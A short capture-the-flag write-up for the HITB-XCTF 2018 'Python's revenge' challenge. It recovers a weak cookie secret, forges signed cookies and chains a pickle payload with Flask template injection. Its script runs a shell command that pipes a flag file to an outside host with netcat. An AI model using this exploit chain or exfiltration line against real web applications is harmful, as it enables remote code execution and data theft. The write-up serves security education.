# HITB-XCTF 2018 Quals : Python's revenge

## Write-up

first, we could see that “cookie_secret” did not change and that it was only 4 bytes.
through the process of creating the same cookie, we can see that "cookie_secret" is "hitb".
So we were able to create cookies that worked fine and could use the "pickle load bug".

But, Filtering with “black_type_list” was strict.
So we came up with another vulnerability called SSTI using "render_template_string".

```py
from base64 import b64decode as b64d
from base64 import b64encode as b64e
from hashlib import sha256
import pickle
def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)

def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()

cookie_secret = "hitb" 
#a = "cflask.templating\nrender_template_string\np0\n(S\"{{request.__class__.__mro__[8].__subclasses__()[40]('app.py').read()}}\"\np1\ntp2\nRp3\n."
#a = "cflask.templating\nrender_template_string\np0\n(S\"{{request.__class__.__mro__[8].__subclasses__()}}\"\np1\ntp2\nRp3\n."

a = "cflask.templating\nrender_template_string\np0\n(S\"{{request.__class__.__mro__[8].__subclasses__()[312]('cat ../flag_is_here|nc wooeong.kr 9999',shell=True)}}\"\np1\ntp2\nRp3\n."
location = b64e(a)
print repr(location)
cookie = make_cookie(location, cookie_secret)
print repr(cookie)
```


> flag : # HITB{Py5h0n1st8eBe3tNOW}

